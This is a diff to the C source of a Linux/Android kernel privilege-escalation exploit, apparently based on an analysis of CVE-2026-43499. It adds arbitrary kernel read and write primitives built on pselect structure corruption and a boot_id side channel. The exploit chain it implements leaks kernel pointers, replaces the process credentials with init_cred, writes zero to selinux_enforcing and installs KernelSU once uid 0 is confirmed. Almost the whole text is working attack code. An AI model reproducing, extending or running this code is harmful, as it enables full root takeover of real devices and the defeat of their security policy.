@@ -1,4 +1,5 @@
 #include "common.h"
+void run_main_route_threads(void);
 #include <stdarg.h>
 
 #ifndef PSELECT_CFI_ROUTE_ATTEMPTS
@@ -754,18 +755,273 @@ int restore_slide_boot_id(int fd) {
          slide_bootid_after == slide_bootid_want;
 }
 
-int install_child_root(int fd) {
-  root_stage_entered = 0;
-  root_stage_ok = 0;
-  int transport_ok = install_pipe_physrw(fd);
-  root_stage_transport_ok = transport_ok;
-  if (!transport_ok) {
-    pr_info("ROOT_STAGE_TRANSPORT_FAIL cache=%d read=%d write=%d read64=%d write64=%d\n",
-            pipe_cache_gate_ok, physrw_read_ok, physrw_write_ok,
-            physrw_read64_ok, physrw_write64_ok);
+/*
+ * Direct write 原语 — 来自 Linuxoid-cn CVE-2026-43499-Poc-Analysis
+ *
+ * 每次写入 fork 子进程:
+ *   1. set_pselect_write(target, value, shape)
+ *   2. prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE)
+ *   3. prepare_skb_payload(page, PAGE_PAYLOAD_FOPS)
+ *   4. run_main_route_threads()
+ *
+ * shape=0: 读取模式 (boot_id sidecar)
+ * shape=1: 写入模式 (target-8=parent, value=right)
+ */
+
+#define DIRECT_WRITE_ATTEMPTS 3
+#define DIRECT_WRITE_TIMEOUT_SEC 8
+
+static uint64_t monotonic_ms(void) {
+  struct timespec ts;
+  clock_gettime(CLOCK_MONOTONIC, &ts);
+  return (uint64_t)ts.tv_sec * 1000 + (uint64_t)ts.tv_nsec / 1000000;
+}
+
+static void kill_and_reap_group(pid_t child) {
+  kill(-child, SIGKILL);
+  int status;
+  waitpid(child, &status, 0);
+}
+
+static int direct_pselect_write_once_internal(
+    uintptr_t target, uintptr_t value, int shape, int idx,
+    uintptr_t followup_target, int followup_idx) {
+  if (shape < 0 || shape > 1) {
+    errno = EINVAL;
     return 0;
   }
-  return root_stage(fd);
+
+  pid_t expected_parent = getpid();
+  pid_t child = fork();
+  if (child < 0) {
+    pr_warning("direct-w64[%d] fork failed errno=%d\n", idx, errno);
+    return 0;
+  }
+
+  if (child == 0) {
+    if (setpgid(0, 0) != 0) _exit(10);
+    if (prctl(PR_SET_PDEATHSIG, SIGKILL) != 0 || getppid() != expected_parent)
+      _exit(11);
+
+    page_base = 0;
+    fake_lock = 0;
+    fake_w0 = 0;
+    fake_task = 0;
+    set_pselect_write(target, value, shape);
+
+    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
+    if (!page_base || !fake_lock || !fake_w0 || !fake_task) _exit(12);
+
+    uintptr_t heap_page = page_base;
+    uintptr_t heap_lock = fake_lock;
+    uintptr_t heap_w0 = fake_w0;
+    uintptr_t heap_task = fake_task;
+
+    if (!prepare_skb_payload(page_base, PAGE_PAYLOAD_FOPS) ||
+        page_base != heap_page || fake_lock != heap_lock ||
+        fake_w0 != heap_w0 || fake_task != heap_task) {
+      _exit(13);
+    }
+
+    pr_success("direct-w64[%d] target=%016zx value=%016zx shape=%d "
+               "workspace=%016zx\n",
+               idx, target, value, shape, page_base);
+    run_main_route_threads();
+
+    int triggered = atomic_load(&route_done) &&
+                    atomic_load(&consumer_calls) > 0 &&
+                    atomic_load(&consumer_success) > 0;
+    if (triggered && followup_target) {
+      uintptr_t followup_value = page_base + 0x100;
+      int followup_ok = 0;
+      for (int attempt = 0; attempt < 3; attempt++) {
+        if (direct_pselect_write_once_internal(
+                followup_target, followup_value, 1,
+                followup_idx + attempt, 0, 0)) {
+          followup_ok = 1;
+          break;
+        }
+      }
+      _exit(followup_ok ? 0 : 15);
+    }
+    _exit(triggered ? 0 : 16);
+  }
+
+  if (setpgid(child, child) != 0 && errno != EACCES && errno != ESRCH) {
+    pr_warning("direct-w64[%d] parent setpgid failed child=%d errno=%d\n",
+               idx, child, errno);
+  }
+
+  uint64_t deadline = monotonic_ms() + (uint64_t)DIRECT_WRITE_TIMEOUT_SEC * 1000;
+  int status = 0;
+  for (;;) {
+    pid_t got = waitpid(child, &status, WNOHANG);
+    if (got == child) break;
+    if (got < 0) {
+      if (errno == EINTR) continue;
+      kill_and_reap_group(child);
+      return 0;
+    }
+    if (monotonic_ms() >= deadline) {
+      pr_warning("direct-w64[%d] timeout child=%d seconds=%d\n",
+                 idx, child, DIRECT_WRITE_TIMEOUT_SEC);
+      kill_and_reap_group(child);
+      errno = ETIMEDOUT;
+      return 0;
+    }
+    usleep(10000);
+  }
+
+  if (!WIFEXITED(status) || WEXITSTATUS(status) != 0) {
+    pr_warning("direct-w64[%d] child=%d status=0x%x\n", idx, child, status);
+    return 0;
+  }
+  return 1;
+}
+
+static int direct_pselect_write_once(
+    uintptr_t target, uintptr_t value, int shape, int idx) {
+  return direct_pselect_write_once_internal(target, value, shape, idx, 0, 0);
+}
+
+static int direct_trigger_write64(
+    const char *name, uintptr_t target, uintptr_t value,
+    int shape, int *write_idx) {
+  for (int attempt = 1; attempt <= DIRECT_WRITE_ATTEMPTS; attempt++) {
+    int idx = (*write_idx)++;
+    pr_success("direct-step %s attempt=%d/%d target=%016zx value=%016zx\n",
+               name, attempt, DIRECT_WRITE_ATTEMPTS, target, value);
+    if (direct_pselect_write_once(target, value, shape, idx)) {
+      return 1;
+    }
+  }
+  return 0;
+}
+
+static int direct_trigger_write64_followup(
+    const char *name, uintptr_t target, uintptr_t value, int shape,
+    uintptr_t followup_target, int *write_idx) {
+  int idx = (*write_idx)++;
+  int followup_idx = *write_idx;
+  *write_idx += DIRECT_WRITE_ATTEMPTS;
+  pr_success("direct-step %s target=%016zx value=%016zx followup=%016zx\n",
+             name, target, value, followup_target);
+  return direct_pselect_write_once_internal(
+      target, value, shape, idx, followup_target, followup_idx);
+}
+
+/*
+ * direct_read_boot_id_raw: 读取 /proc/sys/kernel/random/boot_id 的原始16字节
+ */
+static int direct_read_boot_id_raw(unsigned char raw[16]) {
+  memset(raw, 0, 16);
+  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
+  if (fd < 0) {
+    pr_warning("direct boot_id open failed errno=%d\n", errno);
+    return 0;
+  }
+  char buf[64] = {0};
+  ssize_t n = read(fd, buf, sizeof(buf) - 1);
+  close(fd);
+  if (n <= 0) {
+    pr_warning("direct boot_id read failed ret=%zd errno=%d\n", n, errno);
+    return 0;
+  }
+  buf[n] = 0;
+  /* 解析 UUID 格式: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
+   * 提取前16字节的 hex 值 */
+  int out = 0;
+  for (int i = 0; buf[i] && out < 16; i++) {
+    char c = buf[i];
+    if (c == '-' || c == '\n') continue;
+    int v = -1;
+    if (c >= '0' && c <= '9') v = c - '0';
+    else if (c >= 'a' && c <= 'f') v = c - 'a' + 10;
+    else if (c >= 'A' && c <= 'F') v = c - 'A' + 10;
+    if (v < 0) continue;
+    if (out % 2 == 0)
+      raw[out / 2] = (unsigned char)(v << 4);
+    else
+      raw[out / 2] |= (unsigned char)v;
+    out++;
+  }
+  return out >= 32;  /* 需要完整的32个hex字符(16字节) */
+}
+
+/*
+ * direct_read_shape0_exact64_once: 通过 boot_id sidecar 读取内核地址
+ *
+ * 机制:
+ *   1. direct_pselect_write_once(boot_id_data, target_addr, shape=0)
+ *   2. 读取 /proc/sys/kernel/random/boot_id
+ *   3. 验证 sidecar 值确认读取成功
+ *
+ * shape=0 的 fd_set 布局:
+ *   parent = boot_id_data (SLIDE_RANDOM_BOOT_ID_DATA)
+ *   right = 0
+ *   left = target_addr
+ *
+ * rb_insert_color 写入 parent 到 waiter.__rb_parent_color → boot_id 数据被覆写
+ * 读取 /proc/sys/kernel/random/boot_id → 获取 target_addr 处的值
+ */
+#define DIRECT_R64_FATAL  -1
+#define DIRECT_R64_RETRY   0
+#define DIRECT_R64_OK      1
+
+static int direct_read_shape0_exact64_once(
+    uintptr_t q, uint64_t *value, const char *name,
+    int attempt, int *write_idx) {
+  const uintptr_t b = SLIDE_RANDOM_BOOT_ID_DATA;
+
+  if (!value || !write_idx || !is_direct_ptr(b) || !is_kernel_ptr(q) ||
+      (b & 7) != 0 || (q & 7) != 0 || q > UINTPTR_MAX - 16) {
+    pr_error("direct-r64-fatal name=%s phase=precheck attempt=%d "
+             "reason=bad-address B=%016zx Q=%016zx\n",
+             name, attempt, b, q);
+    return DIRECT_R64_FATAL;
+  }
+
+  int idx = (*write_idx)++;
+
+  pr_success("direct-r64-plan name=%s attempt=%d/%d idx=%d shape=0 "
+             "B=%016zx Q=%016zx Q8=%016zx\n",
+             name, attempt, DIRECT_WRITE_ATTEMPTS, idx, b, q, q + 8);
+
+  if (!direct_pselect_write_once(b, q, 0, idx)) {
+    pr_warning("direct-r64-retry name=%s attempt=%d idx=%d\n",
+               name, attempt, idx);
+    return DIRECT_R64_RETRY;
+  }
+
+  unsigned char raw[16] = {0};
+  if (!direct_read_boot_id_raw(raw)) {
+    pr_error("direct-r64-fatal name=%s phase=proc-read attempt=%d\n",
+             name, attempt);
+    return DIRECT_R64_FATAL;
+  }
+
+  uint64_t got = 0;
+  uint64_t sidecar = 0;
+  memcpy(&got, raw, sizeof(got));
+  memcpy(&sidecar, raw + 8, sizeof(sidecar));
+  unsigned int expected_raw8 = (unsigned int)(b & 0xff);
+  int oracle_ok = sidecar == (uint64_t)b && raw[8] == expected_raw8;
+
+  pr_success("direct-r64-oracle name=%s attempt=%d idx=%d "
+             "value=%016llx sidecar=%016llx expected_sidecar=%016zx "
+             "raw8=%02x expected_raw8=%02x ok=%d\n",
+             name, attempt, idx,
+             (unsigned long long)got, (unsigned long long)sidecar, b,
+             (unsigned int)raw[8], expected_raw8, oracle_ok);
+
+  if (!oracle_ok) {
+    pr_error("direct-r64-fatal name=%s phase=oracle attempt=%d "
+             "reason=shape0-poststate-mismatch\n", name, attempt);
+    return DIRECT_R64_FATAL;
+  }
+
+  *value = got;
+  return DIRECT_R64_OK;
 }
 
 /*
@@ -781,71 +1037,23 @@ int install_child_root(int fd) {
  *   4. 写 0 → selinux_enforcing
  *   5. fork 子进程验证 uid=0
  */
-static int direct_write_once(uintptr_t target, uint64_t value, int shape) {
-  pid_t child = fork();
-  if (child < 0) {
-    pr_warning("direct-w fork failed errno=%d\n", errno);
-    return 0;
-  }
-  if (child == 0) {
-    set_pselect_write(target, value, shape);
-    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
-    if (!page_base || !fake_lock || !fake_w0 || !fake_task) {
-      _exit(12);
-    }
-    if (!prepare_skb_payload(page_base, PAGE_PAYLOAD_FOPS)) {
-      _exit(13);
-    }
-    run_main_route_threads();
-    int ok = atomic_load(&route_done) &&
-             atomic_load(&consumer_calls) > 0 &&
-             atomic_load(&consumer_success) > 0;
-    _exit(ok ? 0 : 16);
-  }
-  int status = 0;
-  for (int i = 0; i < 300; i++) {
-    pid_t w = waitpid(child, &status, WNOHANG);
-    if (w == child) break;
-    if (w < 0 && errno != EINTR) return 0;
-    usleep(10000);
-  }
-  return WIFEXITED(status) && WEXITSTATUS(status) == 0;
-}
-
-static int direct_read64(uintptr_t target, uint64_t *out) {
-  /* 用 boot_id sidecar 验证读取:
-   * shape=0: parent=value(boot_id_data), left=target
-   * rb_set_parent_color 写入 parent 到 waiter.__rb_parent_color
-   * boot_id 数据被覆写 → /proc/sys/kernel/random/boot_id 返回验证值 */
-  uintptr_t boot_id_data = SLIDE_RANDOM_BOOT_ID_DATA;
-  if (!is_direct_ptr(boot_id_data) || !is_kernel_ptr(target) ||
-      (boot_id_data & 7) != 0 || (target & 7) != 0) {
-    return 0;
-  }
-  if (!direct_write_once(boot_id_data, target, 0)) {
-    return 0;
-  }
-  /* 读取 boot_id 验证 */
-  unsigned char raw[16] = {0};
-  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
-  if (fd < 0) return 0;
-  ssize_t n = read(fd, raw, 16);
+static int direct_read_enforcing(void) {
+  char value[16];
+  memset(value, 0, sizeof(value));
+  int fd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
+  if (fd < 0) return -1;
+  ssize_t n = read(fd, value, sizeof(value) - 1);
   close(fd);
-  if (n < 8) return 0;
-  uint64_t got = 0;
-  memcpy(&got, raw, 8);
-  uint64_t sidecar = 0;
-  memcpy(&sidecar, raw + 8, 8);
-  if (sidecar != (uint64_t)boot_id_data) {
-    pr_warning("direct-read sidecar mismatch got=%016llx want=%016zx\n",
-               (unsigned long long)sidecar, boot_id_data);
-    return 0;
-  }
-  *out = got;
-  return 1;
+  if (n <= 0) return -1;
+  value[n] = 0;
+  if (value[0] == '0' && (value[1] == 0 || value[1] == '\n')) return 0;
+  if (value[0] == '1' && (value[1] == 0 || value[1] == '\n')) return 1;
+  return -1;
 }
 
-static int direct_cred_replace(void) {
+int direct_cred_replace(void) {
+  int write_idx = 0;
+
   fops_route_log("DIRECT_CRED_ENTER: pid=%d uid=%d kaslr=%d base=%016llx\n",
                  getpid(), getuid(), kaslr_done,
                  (unsigned long long)kaslr_base);
@@ -857,9 +1065,14 @@ static int direct_cred_replace(void) {
   /* 步骤 1: 泄漏 per_cpu_offset */
   uintptr_t percpu_slot = data_addr(PER_CPU_OFFSET);
   uint64_t percpu_delta = 0;
-  if (!direct_read64(percpu_slot, &percpu_delta)) {
-    fops_route_log("DIRECT_CRED_FAIL: per_cpu_offset leak failed\n");
-    return 0;
+  for (int attempt = 1; attempt <= DIRECT_WRITE_ATTEMPTS; attempt++) {
+    int rr = direct_read_shape0_exact64_once(
+        percpu_slot, &percpu_delta, "per_cpu_offset", attempt, &write_idx);
+    if (rr == DIRECT_R64_OK) break;
+    if (rr == DIRECT_R64_FATAL || attempt == DIRECT_WRITE_ATTEMPTS) {
+      fops_route_log("DIRECT_CRED_FAIL: per_cpu_offset leak failed\n");
+      return 0;
+    }
   }
   fops_route_log("DIRECT_PERCPU: delta=%016llx slot=%016llx\n",
                  (unsigned long long)percpu_delta,
@@ -867,10 +1080,24 @@ static int direct_cred_replace(void) {
 
   /* 步骤 2: 泄漏 entry_task (当前 CPU 的 task_struct 指针) */
   uintptr_t entry_slot = data_addr(ENTRY_TASK) + (uintptr_t)percpu_delta;
-  uint64_t task = 0;
-  if (!direct_read64(entry_slot, &task) || !is_kernel_ptr(task)) {
-    fops_route_log("DIRECT_CRED_FAIL: entry_task leak failed slot=%016llx\n",
+  if (!is_kernel_ptr(entry_slot) || (entry_slot & 7) != 0) {
+    fops_route_log("DIRECT_CRED_FAIL: bad entry_slot=%016llx\n",
                    (unsigned long long)entry_slot);
+    return 0;
+  }
+  uint64_t task = 0;
+  for (int attempt = 1; attempt <= DIRECT_WRITE_ATTEMPTS; attempt++) {
+    int rr = direct_read_shape0_exact64_once(
+        entry_slot, &task, "entry_task", attempt, &write_idx);
+    if (rr == DIRECT_R64_OK) break;
+    if (rr == DIRECT_R64_FATAL || attempt == DIRECT_WRITE_ATTEMPTS) {
+      fops_route_log("DIRECT_CRED_FAIL: entry_task leak failed\n");
+      return 0;
+    }
+  }
+  if (!is_kernel_ptr(task)) {
+    fops_route_log("DIRECT_CRED_FAIL: bad task=%016llx\n",
+                   (unsigned long long)task);
     return 0;
   }
   fops_route_log("DIRECT_TASK: task=%016llx\n", (unsigned long long)task);
@@ -885,26 +1112,22 @@ static int direct_cred_replace(void) {
                  (unsigned long long)cred_slot,
                  (unsigned long long)init_cred);
 
-  if (!direct_write_once(real_cred_slot, init_cred, 1)) {
+  if (!direct_trigger_write64(
+          "install_real_cred", real_cred_slot, init_cred, 1, &write_idx)) {
     fops_route_log("DIRECT_CRED_FAIL: real_cred write failed\n");
     return 0;
   }
   fops_route_log("DIRECT_REAL_CRED: OK\n");
 
-  if (!direct_write_once(cred_slot, init_cred, 1)) {
+  /* 步骤 4: 写 init_cred → task->cred, 同时 followup 写 0 → selinux_enforcing */
+  uintptr_t selinux_addr = text_addr(SELINUX_ENFORCING);
+  if (!direct_trigger_write64_followup(
+          "install_cred_then_selinux_zero", cred_slot, init_cred, 1,
+          selinux_addr, &write_idx)) {
     fops_route_log("DIRECT_CRED_FAIL: cred write failed\n");
     return 0;
   }
   fops_route_log("DIRECT_CRED: OK\n");
-
-  /* 步骤 4: 写 0 → selinux_enforcing */
-  uintptr_t selinux_addr = text_addr(SELINUX_ENFORCING);
-  if (!direct_write_once(selinux_addr, 0, 1)) {
-    fops_route_log("DIRECT_SELINUX_FAIL: enforcing write failed\n");
-    /* SELinux 失败不阻塞 — cred 已经替换 */
-  } else {
-    fops_route_log("DIRECT_SELINUX: OK\n");
-  }
 
   /* 步骤 5: fork 子进程验证 uid=0 */
   pid_t verify = fork();
@@ -913,7 +1136,6 @@ static int direct_cred_replace(void) {
     uid_t euid = geteuid();
     fops_route_log("DIRECT_VERIFY: uid=%u euid=%u\n", uid, euid);
     if (uid == 0 && euid == 0) {
-      /* 安装 KernelSU */
       install_kernelsu_late_load();
       _exit(0);
     }
@@ -931,6 +1153,20 @@ static int direct_cred_replace(void) {
     cfi_last_errno = 0;
   }
   return ok;
+}
+
+int install_child_root(int fd) {
+  root_stage_entered = 0;
+  root_stage_ok = 0;
+  int transport_ok = install_pipe_physrw(fd);
+  root_stage_transport_ok = transport_ok;
+  if (!transport_ok) {
+    pr_info("ROOT_STAGE_TRANSPORT_FAIL cache=%d read=%d write=%d read64=%d write64=%d\n",
+            pipe_cache_gate_ok, physrw_read_ok, physrw_write_ok,
+            physrw_read64_ok, physrw_write64_ok);
+    return 0;
+  }
+  return root_stage(fd);
 }
 
 int try_cfi_stage(void) {
